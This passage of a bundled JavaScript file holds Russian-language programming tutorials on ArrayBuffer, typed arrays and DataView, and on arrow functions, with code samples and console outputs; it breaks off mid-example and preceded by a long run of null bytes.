\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"},32547:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] ArrayBuffer\n\n**конструктор**\n\nСоздает объект с двоичными данными в виде строки.\n\nНепосредственного доступа к данным в экземпляре ~ArrayBuffer~ нет.\n\nДоступна для чтения только длина буфера в байтах.\n\n~~~js\nvar buffer  = new ArrayBuffer(16)\nconsole.log(buffer.byteLength)  // 16\n~~~\n\n_________________________________\n\n## ![ico-25 icon] TypedArray\n\n[**MDN**](https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Typed_arrays/)\n\nТипизированные массивы имеют фиксированную длину и используются для хранения данных в двоичном формате (\"сырых\" данных).\nДоступ к данным в типизированных массивах возможен только через **представления**, прямого доступа нет.\n\nДвоичные данные, хранящиеся в типизированном массиве, можно интерпретировать как угодно: как строку, как аудио- или видео-файл, как изображение, или как массив чисел.\nКонструктор **TypedArray** также недоступен напрямую, ссылку на него можно получить из цепочки наследования любого экземпляра.\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconst int16Array = new Int16Array(buffer)\nconst typedArrayPrototype = int16Array.__proto__.__proto__\n\nconsole.log(typedArrayPrototype.constructor.name)\n~~~\n\n••'TypedArray'••\n\n~~~js\nconst excluding = ['buffer', 'byteLength', 'byteOffset', 'length']\n\nObject.getOwnPropertyNames(typedArrayPrototype)\n  .filter(name => !excluding.includes(name))\n  .filter(name => typeof typedArrayPrototype[name] === 'function')\n~~~\n\n~~~~console\n▼ (32) ['constructor', 'entries', 'keys', 'values', 'at', 'copyWithin', 'every', 'fill', 'filter', 'find', 'findIndex', 'findLast', 'findLastIndex', 'forEach', 'includes', 'indexOf', 'join', 'lastIndexOf', 'map', 'reverse', 'reduce', 'reduceRight', 'set', 'slice', 'some', 'sort', 'subarray', 'toReversed', 'toSorted', 'with', 'toLocaleString', 'toString']\n    0: \"constructor\"\n    1: \"entries\"\n    2: \"keys\"\n    3: \"values\"\n    4: \"at\"\n    5: \"copyWithin\"\n    6: \"every\"\n    7: \"fill\"\n    8: \"filter\"\n    9: \"find\"\n    10: \"findIndex\"\n    11: \"findLast\"\n    12: \"findLastIndex\"\n    13: \"forEach\"\n    14: \"includes\"\n    15: \"indexOf\"\n    16: \"join\"\n    17: \"lastIndexOf\"\n    18: \"map\"\n    19: \"reverse\"\n    20: \"reduce\"\n    21: \"reduceRight\"\n    22: \"set\"\n    23: \"slice\"\n    24: \"some\"\n    25: \"sort\"\n    26: \"subarray\"\n    27: \"toReversed\"\n    28: \"toSorted\"\n    29: \"with\"\n    30: \"toLocaleString\"\n    31: \"toString\"\n    length: 32\n  ► [[Prototype]]: Array(0)\n~~~~\n\n_____________________________________\n\n## ![ico-25 icon] Акцессоры\n\nДля работы с данными экземпляра ~ArrayBuffer~ необходимо использовать конструкторы, создающие экземпляры **аксессоров**.\n\n![ico-20 green-ok] DataView\n![ico-20 green-ok] Int8Array\n![ico-20 green-ok] Uint8Array\n![ico-20 green-ok] Int16Array\n![ico-20 green-ok] Uint16Array\n![ico-20 green-ok] Int32Array\n![ico-20 green-ok] Uint32Array\n\n~~~js\nvar sample = new ArrayBuffer(32)\nnew Uint8Array(sample)\n// ► Uint8Array(32) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Int16Array(sample)\n// ► Int16Array(16) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Uint16Array(sample)\n// ► Uint16Array(16) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Uint32Array(sample)\n// ► Uint32Array(8) [0, 0, 0, 0, 0, 0, 0, 0]\nnew Int32Array(sample)\n// ► Int32Array(8) [0, 0, 0, 0, 0, 0, 0, 0]\n~~~\n\nРезультатом вызова конструкторов ~Int8Array~, ~Uint8Array~, ~Int16Array~, ~Uint16Array~, ~Int32Array~, ~Uint32Array~ будет *_итерабельный объект_* с числовыми данными.\n\nДля получения массива можно использовать метод **~ArrayFrom()~**:\n\n~~~js\nvar buffer  = new ArrayBuffer(16)\nvar sample = Array.from(new Uint8Array(buffer))\nsample[0] = 50\nsample[3] = 255\nsample[4] = 178\nconsole.log(sample)\n~~~\n\n**Результат**\n\n•• ► (16) [50, 0, 0, 255, 178, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]••\n\nОднако это \"дорога в одну сторону\", поскольку приводит к созданию нового массива **~sample~**, изменения в котором не отражаются на исходном объекте **~buffer~**.\n\n______________________________________________\n\n### ![ico-20 icon] DataView\n\nС помощью этого конструктора создается экземпляр акцессора, обеспечивающего гибкий доступ к данным исходного экземпляра ~ArrayBuffer~.\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\nconsole.log(dataView.__proto__)\n~~~\n\n~~~console\n▼ DataView {constructor: ƒ, getInt8: ƒ, …}\n    buffer: (...)\n    byteLength: (...)\n    byteOffset: (...)\n  ► constructor: ƒ DataView()\n  ► getBigInt64: ƒ getBigInt64()\n  ► getBigUint64: ƒ getBigUint64()\n  ► getFloat32: ƒ getFloat32()\n  ► getFloat64: ƒ getFloat64()\n  ► getInt8: ƒ getInt8()\n  ► getInt16: ƒ getInt16()\n  ► getInt32: ƒ getInt32()\n  ► getUint8: ƒ getUint8()\n  ► getUint16: ƒ getUint16()\n  ► getUint32: ƒ getUint32()\n  ► setBigInt64: ƒ setBigInt64()\n  ► setBigUint64: ƒ setBigUint64()\n  ► setFloat32: ƒ setFloat32()\n  ► setFloat64: ƒ setFloat64()\n  ► setInt8: ƒ setInt8()\n  ► setInt16: ƒ setInt16()\n  ► setInt32: ƒ setInt32()\n  ► setUint8: ƒ setUint8()\n  ► setUint16: ƒ setUint16()\n  ► setUint32: ƒ setUint32()\n    Symbol(Symbol.toStringTag): \"DataView\"\n  ► get buffer: ƒ buffer()\n  ► get byteLength: ƒ byteLength()\n  ► get byteOffset: ƒ byteOffset()\n  ► __proto__: Object\n~~~\n\n_________________________________\n\n### ![ico-20 icon] Int16Array\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconsole.log(new Int16Array(buffer))\n~~~\n\n~~~console\n▼ Int16Array(4) [1280, 9, 8, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 4, Symbol(Symbol.toStringTag): 'Int16Array']\n    0: 0\n    1: 0\n    2: 0\n    3: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 4\n    Symbol(Symbol.toStringTag): \"Int16Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n~~~js\nconst buffer = new ArrayBuffer(7)\nconsole.log(new Int16Array(buffer))\n~~~\n\n~~~error\n  Uncaught RangeError: byte length of Int16Array should be a multiple of 2\n~~~\n_________________________________________\n\n### ![ico-20 icon] setInt8\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt8(2, 78)\ndataView.setInt8(3, 94)\ndataView.setInt8(5, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 78, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 24142, 14080, 0, 0, 0, 0, 0]\n  ► [[Int32Array]]: Int32Array(4) [1582170112, 14080, 0, 0]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 78, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n### ![ico-25 icon] setInt16\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt16(1, 78)\ndataView.setInt16(3, 94)\ndataView.setInt16(5, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 78, 0, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 78, 94, 55, 0, 0, 0, 0]\n  ► [[Int32Array]]: Int32Array(4) [5111808, 3604574, 0, 0]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 78, 0, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n### ![ico-25 icon] setInt32\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt16(3, 78)\ndataView.setInt16(7, 94)\ndataView.setInt16(11, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 0, 0, 78, 0, 0, 0, 94, 0, 0, 0, 55, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 0, 78, 0, 94, 0, 55, 0]\n  ► [[Int32Array]]: Int32Array(4) [0, 78, 94, 55]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 0, 0, 78, 0, 0, 0, 94, 0, 0, 0, 55, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n## ![ico-25 icon] Examples\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst picture = document.body\n  .appendChild(document.createElement('img'))\n\nfetch('https://avatars.githubusercontent.com/u/19735284?v=4')\n  .then(response => response.arrayBuffer())\n  .then(response => Object.assign(picture, {\n    src: URL.createObjectURL(new Blob([new Uint8Array(response)]))\n  }))\n~~~\n\n________________________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconst dataView = new DataView(buffer)\n\ndataView.setInt8(1, 5)\ndataView.setInt8(2, 9)\ndataView.setInt8(4, 8)\n\nconsole.log(new Int8Array(buffer))\nconsole.log(new Int16Array(buffer))\n~~~\n\n◘◘**^^Int8Array^^**◘◘\n~~~console\n▼ Int8Array(8) [0, 5, 9, 0, 8, 0, 0, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 8, Symbol(Symbol.toStringTag): 'Int8Array']\n    0: 0\n    1: 5\n    2: 9\n    3: 0\n    4: 8\n    5: 0\n    6: 0\n    7: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 8\n    Symbol(Symbol.toStringTag): \"Int8Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n◘◘**^^Int16Array^^**◘◘\n~~~console\n▼ Int16Array(4) [1280, 9, 8, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 4, Symbol(Symbol.toStringTag): 'Int16Array']\n    0: 1280\n    1: 9\n    2: 8\n    3: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 4\n    Symbol(Symbol.toStringTag): \"Int16Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n__________________________________\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst buffer = new ArrayBuffer(2000)\n\nconst log = new DataView(buffer)\n\nfunction click (index) {\n  const byteIndex = parseInt(index / 8)\n\n  if (byteIndex > buffer.byteLength - 1) return\n\n  let value = log.getUint8(byteIndex)\n\n  const bitIndex = index % 8\n\n  let binaryValue = value.toString(2).padStart(8, '0')\n\n  binaryValue = binaryValue\n    .split('')\n    .map((char, num) => num === bitIndex ? '1' : char)\n    .join('')\n\n  log.setUint8(byteIndex, parseInt(binaryValue, 2))\n}\n\nconst clicks = [0, 1, 2, 3, 4, 5, 6, 7, 8, 59, 64, 65, 66, 78, 99, 100, 102, 104, 108]\nclicks.forEach(num => click(num))\n\nsetTimeout(() => {\n  const result = Array.from(new Uint8Array(buffer))\n    .map((item, index) => item ? index : null)\n    .filter(index => index !== null)\n    .map(index => ({\n      [index]: log.getUint8(index).toString(2).padStart(8, '0')\n    }))\n  console.log(result.reduce((res, item) => Object.assign(res, item), {}))\n}, 2000)\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ {0: '11111111', 1: '10000000', 7: '00010000', 8: '11100000', 9: '00000010', 12: '00011010', 13: '10001000'}\n    0: \"11111111\"\n    1: \"10000000\"\n    7: \"00010000\"\n    8: \"11100000\"\n    9: \"00000010\"\n    12: \"00011010\"\n    13: \"10001000\"\n  ► [[Prototype]]: Object\n~~~\n"},22346:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Стрелочные функции\n\n**ES6**\n\n## ![ico-25 icon] Синтаксис\n\n![ico-20 error] **_function_**\n\nВ сигнатуре стрелочной функции нет слова **_function_**:\n\n~~~js\n(параметры) => { тело функции }\n~~~\n\nОтсюда логичным образом вытекает, что при объявлении стрелочной функции всегда используется **function expression**:\n\n~~~js\nconst multiply = (x, y) => x * y\nmultiply(2, 5)  // 10\n~~~\n\n______________________\n\n![ico-20 green-ok] Если тело функции состоит из одной операции, фигурные скобки можно опустить:\n\n~~~js\nconst sayHi = (name = 'user') => console.info(`Hi, ${name}`)\n~~~\n\n![ico-20 green-ok] Если у функции всего один формальный параметр, круглые скобки можно опустить:\n\n~~~js\nconst sayHi = name => console.info(`Hi, ${name}`)\n~~~\n\n![ico-20 green-ok] При отсутствии формальных параметров круглые скобки обязательны:\n\n~~~js\nconst sayHi = () => console.info('Hi, user')\n~~~\n\n________________________________________\n\n![ico-20 green-ok] Стрелка **~=>~** в стрелочной функции является оператором **~return~**. Поэтому при отсутствии фигурных скобок, если тело функции состоит из одного выражения, значение которого возвращает функция, оператор **~return~** не используется:\n\n~~~js\n// обычная функция\nconst multiply = function (x, y) { return x * y }\n\n// стрелочная функция\nconst multiply = (x, y) => x * y\n~~~\n\n![ico-20 green-ok] Операторы ветвления кода (кроме тернарного оператора) и операторы цикла нужно заключать в фигурные скобки.\n\n◘◘![ico-25 cap] оператор _for_◘◘\n\n~~~js\nconst iterate = len => {\n  for (let i = 1; i <= len; i++) console.log(i)\n}\n~~~\n\nИ тут мы можем убедиться в преимуществах итерирующих методов массивов:\n\n~~~js\nconst iterate = len => new Array(len).fill(0).forEach((item, index) => console.log(index + 1))\n~~~\n\n◘◘![ico-25 cap] оператор _switch_◘◘\n\n~~~js\nconst getAnswer = question => {\n  switch (question) {\n    case 'who':\n      return 'student'\n    case 'what':\n      return 'develop'\n    case 'where':\n      return 'Kharkiv'\n    default:\n      return 'I don\\'t undestand your question.'\n  }\n}\n~~~\n\n◘◘![ico-25 cap] тернарный оператор◘◘\n\n~~~js\nconst getAnswer = question => question === 'who'\n  ? 'Irina'\n  : question === 'what'\n    ? 'develop'\n    : question === 'where'\n      ? 'Kharkiv'\n      : 'I don\\'t undestand your question'\n~~~\n\nИли так:\n\n~~~js\nconst getAnswer = question => ['who', 'what', 'where'].includes(question)\n  ? ['Irina', 'develop', 'Kharkiv'][['who', 'what', 'where'].indexOf(question)]\n  : 'I don\\'t undestand your question'\n~~~\n\nИли так, если использовать замыкание:\n\n~~~js\nconst getAnswer = ((questions, answers) => question => questions.includes(question)\n  ? answers[questions.indexOf(question)]\n  : 'I don\\'t undestand your question')(['who', 'what', 'where'], ['Irina', 'develop', 'Kharkiv'])\n~~~\n\nИли так, если использовать прием каррирования:\n\n~~~js\nconst getAnswerTemplate = (questions, answers, wrong, question) => questions.includes(question)\n  ? answers[questions.indexOf(question)]\n  : wrong\n\nconst getAnswer = getAnswerTemplate\n  .bind(null, ['who', 'what', 'where'], ['Irina', 'develop', 'Kharkiv'], 'I don\\'t undestand your question')\n~~~\n\n____________________________________________________\n\n## ![ico-25 icon] Главные особенности стрелочных функций\n\n### ![ico-20 icon] prototype\n\n@@@@\nУ стрелочных функций нет объекта  **~prototype~**.<br><br>![ico-20 warn] Поэтому стрелочные функции не могут быть конструктором.\n![](images/arrow-funcs-neutered-kitties.png)\n@@@@\n\n☼☼☼ стрелочные фукции - это кастрированные котики ☼☼☼\n\n~~~js\nconsole.dir(() => {})\n~~~\n\n~~~console\n▼ ƒ anonymous ()\n    length: 0\n    name: \"\"\n    arguments: (...)\n    caller: (...)\n  ► [[Prototype]]: ƒ ()\n~~~\n\n~~~js\nconsole.dir(function () {})\n~~~\n\n~~~console\n▼ ƒ console ()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"\"\n  ► prototype: {}\n  ► [[Prototype]]: ƒ ()\n~~~\n\n![ico-20 warn] При попытке вызвать стрелочную функцию с ключевым словом **~new~**:\n\n~~~js\nconst arrowFunc = () => null\nconst obj = new arrowFunc()\n~~~\n\nбудет сгенерировано исключение:\n\n~~~error\n    TypeError: arrowFunc is not a constructor\n~~~\n\n~~~js\nconst obj = new (function () {})\n\nconsole.log(obj)  // ► {}\n~~~\n\n~~~js\nconst obj = new (() => {})\n~~~\n\n~~~error\n    TypeError: (intermediate value) is not a constructor\n~~~\n\n______________________________________________________\n\n### ![ico-25 icon] arguments\n\nУ стрелочных функций нет объекта  **~arguments~**.\n\nПри попытке обратиться к объекту **~arguments~** из стрелочной функции будет сгенерировано исключение (~ReferenceError~).\n\n~~~error\n    ReferenceError: arguments is not defined\n~~~\n\n![ico-20 pin] Если стрелочная функция объявлена внутри обычной функции,\nто переменные контекста родительской функции будут доступны для стрелочной функции\n(**~цепочка областей видимости~**),\nпоэтому внутри нее будет доступен объект ~arguments~ родительской функции.\n\n~~~js\nfunction testArguments () {\n  (() => console.log(arguments))()\n}\ntestArguments(5, false)\n~~~\n\nВ результате работы кода в консоль будет выведен объект ~arguments~ функции **_testArguments_**:\n\n~~~console\n▼ Arguments(2) [5, false, callee: ƒ, Symbol(Symbol.iterator): ƒ]\n    0: 5\n    1: false\n  ► callee: ƒ testArguments()\n    length: 2\n  ► Symbol(Symbol.iterator): ƒ values()\n  ► [[Prototype]]: Object\n~~~\n\n______________________________________________________\n\n### ![ico-20 icon] Контекст вызова\n\nУ стрелочных функций контекст вызова всегда будет контекстом, в котором функция была объявлена.\n\nИзменить контекст вызова стрелочной функции невозможно.\n\nМожно сказать, что у стрелочных функций \"врожденный\" контекст вызова.\n\n#### ![ico-20 icon] Литерал объекта\n\n~~~js\nwindow.name = 'Chrome'\n\nconst human = {\n  name: 'Stephan',\n  getName () {\n    console.log(this.name)\n  },\n  showName: () => 